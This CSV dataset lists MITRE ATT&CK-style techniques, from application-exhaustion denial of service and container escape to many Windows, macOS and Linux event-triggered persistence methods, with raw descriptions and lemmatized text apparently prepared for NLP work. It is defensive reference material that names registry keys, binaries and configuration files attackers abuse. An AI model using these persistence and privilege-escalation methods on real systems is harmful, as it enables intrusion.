id,name,description,processed
T1499.003,Endpoint Denial of Service: Application Exhaustion Flood,"Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.",adversary target resource intensive feature application cause denial service dos deny availability application example specific feature web application highly resource intensive repeat request feature able exhaust system resource deny access application server
T1499.004,Endpoint Denial of Service: Application or System Exploitation,"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as Data Destruction, Firmware Corruption, Service Stop etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",adversary exploit software vulnerability cause application system crash deny availability user system automatically restart critical application service crash occur likely exploit cause persistent denial service dos condition adversary exploit know zero day vulnerability crash application system lead dependent application system dos condition crash restart application system effect data destruction firmware corruption service stop etc cause dos condition deny availability critical information application system
T1611,Escape to Host,"Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as unshare and keyctl to escalate privileges and steal secrets.Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as docker.sock, to break out of the container via a Container Administration Command.Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",adversary break container gain access underlying host allow adversary access containerize resource host level host principle containerized resource provide clear separation application functionality isolate host environment multiple way adversary escape host environment example include create container configure mount host filesystem bind parameter allow adversary drop payload execute control utility cron host utilize privileged container run command load malicious kernel module underlying host abuse system call unshare keyctl escalate privilege steal secret additionally adversary able exploit compromise container mount container management socket break container container administration command gain access host provide adversary opportunity achieve follow objective establish persistence move laterally environment set command control channel host
T1585,Establish Accounts,"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing.",adversary create cultivate account service targeting adversary create account build persona operation persona development consist development public information presence history appropriate affiliation development apply social medium website publicly available information reference scrutinize legitimacy course operation persona identity operation incorporate social engineering utilization online persona important persona fictitious impersonate real people persona exist single site multiple site ex facebook linkedin twitter google github docker hub etc establish persona require development additional documentation real include fill profile information develop social network incorporate photo establish account include creation account email provider directly leverage phishing information phishing
T1585.001,Establish Accounts: Social Media Accounts,"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).",adversary create cultivate social medium account targeting adversary create social medium account build persona operation persona development consist development public information presence history appropriate affiliation operation incorporate social engineering utilization persona social medium important persona fictitious impersonate real people persona exist single social medium site multiple site ex facebook linkedin twitter etc establish persona social medium require development additional documentation real include fill profile information develop social network incorporate photo persona develop adversary use create connection target interest connection direct include try connect account leveraged phase adversary lifecycle initial access ex spearphishing service
T1585.002,Establish Accounts: Email Accounts,"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing.To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",adversary create email account targeting adversary use account create email provider operation leverage conduct phishing information phishing decrease chance physically tie operation adversary use disposable email service
T1585.003,Establish Accounts: Cloud Accounts,"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.Creating Cloud Accounts may also require adversaries to establish Email Accounts to register with the cloud provider.",adversary create account cloud provider targeting adversary use cloud account operation include leverage cloud storage service dropbox mega microsoft onedrive aws bucket exfiltration cloud storage upload tools cloud account acquisition infrastructure virtual private servers serverless infrastructure establish cloud account allow adversary develop sophisticated capability manage server create cloud accounts require adversary establish email accounts register cloud provider
T1546,Event Triggered Execution,"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",adversary establish persistence elevate privilege system mechanism trigger execution base specific event operate system mean monitor subscribe event logon user activity run specific application binary cloud environment support function service monitor invoke response specific cloud event adversary abuse mechanism means maintain persistent access victim repeatedly execute malicious code gain access victim system adversary create modify event trigger point malicious content execute event trigger invoke execution proxie account high permission system service account adversary able abuse trigger execution mechanism escalate privilege
T1546.001,Event Triggered Execution: Change Default File Association,"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed under HKEY_CLASSES_ROOT.\command. For example: HKEY_CLASSES_ROOT\txtfile\shell\open\command HKEY_CLASSES_ROOT\txtfile\shell\print\command HKEY_CLASSES_ROOT\txtfile\shell\printto\commandThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.",adversary establish persistence execute malicious content trigger file type association file open default program open file call file association handler check file association selection store windows registry edit user administrator program registry access administrator build assoc utility application modify file association give file extension arbitrary program file give extension open system file association list example value key list command execute handler open file extension adversary modify value continually execute arbitrary command
T1546.002,Event Triggered Execution: Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in C:\Windows\System32\, and C:\Windows\sysWOW64\ on 64-bit Windows systems, along with screensavers included with base Windows installations.The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:SCRNSAVE.exe - set to malicious PE path ScreenSaveActive - set to '1' to enable the screensaver ScreenSaverIsSecure - set to '0' to not require a password to unlock ScreenSaveTimeout - sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.",adversary establish persistence execute malicious content trigger user inactivity screensaver program execute configurable time user inactivity consist portable executable pe file file extension windows screensaver application locate bit windows system screensaver include base windows installation following screensaver setting store registry manipulate achieve persistence set malicious pe path screensaveactive set enable screensaver screensaverissecure set require password unlock screensavetimeout set user inactivity timeout screensaver executedadversarie use screensaver setting maintain persistence set screensaver run malware certain timeframe user inactivity
T1546.003,Event Triggered Execution: Windows Management Instrumentation Event Subscription,"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",adversary establish persistence elevate privilege execute malicious content trigger windows management instrumentation wmi event subscription wmi install event filter provider consumer binding execute code define event occur example event subscribe wall clock time user loging computer uptime adversary use capability wmi subscribe event execute arbitrary code event occur provide persistence system wmi subscription execution proxie wmi provider host process result elevated system privilege
T1546.004,Event Triggered Execution: Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",adversary establish persistence execute malicious command trigger user shell user unix shells execute configuration script different point session base event example user open command line interface remotely log ssh login shell initiate login shell execute script system user home directory configure environment login shell system use profile initiate configuration script run permission level directory set environment variable create alias customize user environment shell exit terminate additional shell script execute ensure shell exit appropriately adversary attempt establish persistence insert command script automatically execute shell bash example default shell gnu linux system adversary add command launch malicious binary profile file malware target termination program trigger execution adversary use file execute malicious command end session macos functionality technique similar leverage zsh default shell macos open application launch zsh login shell zsh interactive shell login shell configure system environment profile zshenv zprofile zlogin login shell configure user environment interactive shell use configure user environment exit zlogout execute legacy program macos execute bashrc startup
T1546.005,Event Triggered Execution: Trap,"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where ""command list"" will be executed when ""signals"" are received.",adversary establish persistence execute malicious content trigger interrupt signal trap command allow program shell specify command execute receive interrupt signal common situation script allow graceful termination handling common keyboard interrupt like adversary use register code execute shell encounter specific interrupt persistence mechanism trap command following format trap command list signal command list execute signal receive
T1546.006,Event Triggered Execution: LC_LOAD_DYLIB Addition,"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. There are tools available to perform these changes.Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.",adversary establish persistence execute malicious content trigger execution tainted binary mach o binary series header perform certain operation binary load header mach o binary tell macos os x dynamic library dylib load execution time add ad hoc compile binary long adjustment rest field dependency tool available perform change adversary modify mach o binary header load execute malicious dylib time binary execute change invalidate digital signature binary binary modify remediate simply remove command binary signature check load time
T1546.007,Event Triggered Execution: Netsh Helper DLL,"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.",adversary establish persistence execute malicious content trigger netsh helper dll refer netshell command line scripting utility interact network configuration system contain functionality add helper dll extend functionality utility path register helper dll enter windows registry adversary use helper dll trigger execution arbitrary code persistent manner execution place anytime execute happen automatically persistence technique software ex vpn present system execute normal functionality
T1546.008,Event Triggered Execution: Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen. Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection (WFP/WRP). The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\Windows\System32\utilman.exe) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. Other accessibility features exist that may also be leveraged in a similar fashion: On-Screen Keyboard: C:\Windows\System32\osk.exe Magnifier: C:\Windows\System32\Magnify.exe Narrator: C:\Windows\System32\Narrator.exe Display Switcher: C:\Windows\System32\DisplaySwitch.exe App Switcher: C:\Windows\System32\AtBroker.exe",adversary establish persistence elevate privilege execute malicious content trigger accessibility feature windows contain accessibility feature launch key combination user log ex user windows logon screen adversary modify way program launch command prompt backdoor log system common accessibility program launch shift key press time launch windows u key combination press program refer sticky key adversary unauthenticated access remote desktop login screen depend version windows adversary advantage feature different way common method adversary include replace accessibility feature binary pointer reference binary registry new version windows replace binary need digitally sign system binary reside protect windows file resource protection wfp wrp image file execution option injection debugger method likely discover potential workaround require corresponding accessibility feature binary replace simple binary replacement windows xp later windows server later example program replace program provide backdoor access subsequently press appropriate key combination login screen sit keyboard connect remote desktop protocol cause replace file execute system privilege accessibility feature exist leverage similar fashion screen keyboard magnifier narrator display switcher app switcher
T1546.009,Event Triggered Execution: AppCert DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. Similar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",adversary establish persistence elevate privilege execute malicious content trigger appcert dll load process dynamic link library dll specify appcertdlls registry key load process call ubiquitously application programming interface api function createprocess createprocessasuser createprocesswithloginw createprocesswithtokenw winexec similar process injection value abuse obtain elevated privilege cause malicious dll load run context separate process computer malicious appcert dll provide persistence continuously trigger api activity
T1546.010,Event Triggered Execution: AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.",adversary establish persistence elevate privilege execute malicious content trigger appinit dll load process dynamic link library dll specify value registry key load process load practice nearly program common library similar process injection value abuse obtain elevated privilege cause malicious dll load run context separate process computer malicious appinit dll provide persistence continuously trigger api activity appinit dll functionality disable windows later version secure boot enable
T1546.011,Event Triggered Execution: Application Shimming,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:%WINDIR%\AppPatch\sysmain.sdb and hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdbCustom databases are stored in:%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and hklm\software\microsoft\windows nt\currentversion\appcompatflags\customTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. Shims can also be abused to establish persistence by continuously being invoked by affected programs.",adversary establish persistence elevate privilege execute malicious content trigger application shim microsoft windows application compatibility infrastructure framework application shim create allow backward compatibility software operate system codebase change time example application shimming feature allow developer apply fix application rewrite code create windows xp work windows framework shim create act buffer program specifically import address table windows os program execute shim cache reference determine program require use shim database shim database use hooking redirect code necessary order communicate os list shim currently instal default windows installer keep database store shim secure windows design run user mode modify kernel administrator privilege install shim certain shim bypass user account control uac redirectexe inject dll process injectdll disable data execution prevention disablenx structure exception handling disableseh intercept memory address shim allow adversary perform malicious act elevate privilege install backdoor disable defense like windows defender etc shim abuse establish persistence continuously invoke affected program
T1546.012,Event Triggered Execution: Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., C:\dbg\ntsd.exe -g notepad.exe). IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). Similar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the ""debugger"" program to be executed with SYSTEM privileges. Similar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.Malware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.",adversary establish persistence elevate privilege execute malicious content trigger image file execution options ifeo debugger ifeos enable developer attach debugger application process create debugger present application ifeo prepende application effectively launch new process debugger ifeos set directly registry global flags gflags tool ifeos enable arbitrary monitor program launch specify program silently exit prematurely terminate second non kernel mode process similar accessibility features windows vista later windows server later registry key modify configure program provide backdoor access debugger accessibility program ex registry modify press appropriate key combination login screen keyboard connect remote desktop protocol cause debugger program execute system privilege similar process injection value abuse obtain privilege escalation cause malicious executable load run context separate process computer instal ifeo mechanism provide persistence continuous trigger invocation malware use ifeo impair defense register invalid debugger redirect effectively disable system security application
T1546.013,Event Triggered Execution: PowerShell Profile,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the -NoProfile flag is used when it is launched. An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.",adversary gain persistence elevate privilege execute malicious content trigger powershell profile powershell profile script run powershell start logon script customize user environment powershell support profile depend user host program example different profile powershell host program powershell console powershell ise visual studio code administrator configure profile apply user host program local computer adversary modify profile include arbitrary command function module powershell drive gain persistence time user open powershell session modify script execute flag launch adversary able escalate privilege script powershell profile load execute account high privilege domain administrator
T1546.014,Event Triggered Execution: Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the Launch Daemon configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist.Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.",adversary gain persistence elevate privilege execute malicious content trigger event monitor daemon emond emond launch daemon accept event service run simple rule engine take action emond binary emond load rule directory action explicitly define event take place rule file plist format define event type action example event type include system startup user authentication example action run system command send email emond service launch file present queuedirectories path var db emondclient specify launch daemon configuration file system library launchdaemons adversary abuse service write rule execute command define event occur system start user authentication adversary able escalate privilege administrator root emond service execute root privilege launch daemon service
T1546.015,Event Triggered Execution: Component Object Model Hijacking,"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system. References to various COM objects are stored in the Registry. Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",adversary establish persistence execute malicious content trigger hijack reference component object model com object com system windows enable interaction software component operate system reference com object store registry adversary use com system insert malicious code execute place legitimate software hijack com reference relationship means persistence hijack com object require change registry replace reference legitimate system component cause component work execute system component execute normal system operation adversary code execute instead adversary likely hijack object frequently maintain consistent level persistence unlikely break noticeable functionality system avoid system instability lead detection
T1546.016,Event Triggered Execution: Installer Packages,"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS postinstall scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a Launch Daemon) with the elevated permissions.Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include preinst, postinst, prerm, postrm scripts and run as root when executed.For Windows, the Microsoft Installer services uses .msi files to manage the installing, updating, and uninstalling of applications. Adversaries have leveraged Prebuild and Postbuild events to run commands before or after a build when installing .msi files.",adversary establish persistence elevate privilege installer trigger execution malicious content installer package os specific contain resource operate system need install application system installer package include script run prior installation installation complete installer script inherit elevate permission execute developer use script prepare environment installation check requirement download dependency remove file installation legitimate application adversary distribute application modify installer script execute malicious content user install application require grant administrative permission allow installation end installation process legitimate application content macos postinstall script execute inherit elevated permission adversary use script execute malicious executable install malicious component launch daemon elevated permission depend distribution linux version package installer script call maintainer script post installation script script include preinst postinst prerm postrm script run root execute windows microsoft installer service use file manage installing updating uninstalling application adversary leverage prebuild postbuild event run command build instal file
T1480,Execution Guardrails,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",adversary use execution guardrail constrain execution action base adversary supply environment specific condition expect present target guardrail ensure payload execute intended target reduce collateral damage adversary campaign guardrail prevent exposure capability environment intend compromise operate use guardrail distinct typical virtualization sandbox evasion use virtualization sandbox evasion involve check know sandbox value continue execution match use guardrail involve check expect target specific value continue execution match
